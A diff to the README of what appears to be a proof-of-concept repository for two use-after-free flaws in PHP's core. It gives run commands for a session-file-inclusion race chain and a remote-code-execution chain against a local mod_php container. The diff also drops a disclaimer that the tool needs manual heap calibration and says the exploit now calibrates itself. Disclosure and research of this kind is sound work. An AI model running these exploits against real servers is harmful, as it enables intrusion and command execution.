@@ -19,7 +19,7 @@ Two critical (CVSS 9.2) use-after-free vulnerabilities in PHP's core, affecting 
 
 ## What this repo is NOT
 
-- A "push button, get shell" tool (requires per-build heap calibration -- see chain2 docs)
+- A generic scanner; it targets Apache mod_php with prefork MPM specifically
 
 ## Quick start
 
@@ -35,8 +35,9 @@ docker-compose -f docker-compose.modphp.yml up -d
 python3 chains/chain1_session_lfi/race.py id
 
 # Chain 2: Full RCE via PHPSESSID heap leak (CVE-2026-109618)
-# Requires: modphp-vuln container (8.4.26, single-worker, 8M memory_limit)
-python3 chains/chain2_oom/poc_rce.py 8896 "id>/tmp/pwned"
+# Auto-detects workers, memory_limit, calibrates heap params at runtime
+python3 chains/chain2_oom/poc_rce.py -u http://127.0.0.1:8896/index.php \
+  -c "id>/tmp/pwned" --container modphp-vuln
 # Or info leak only:
 python3 chains/chain2_oom/poc_info_leak.py 8896
 
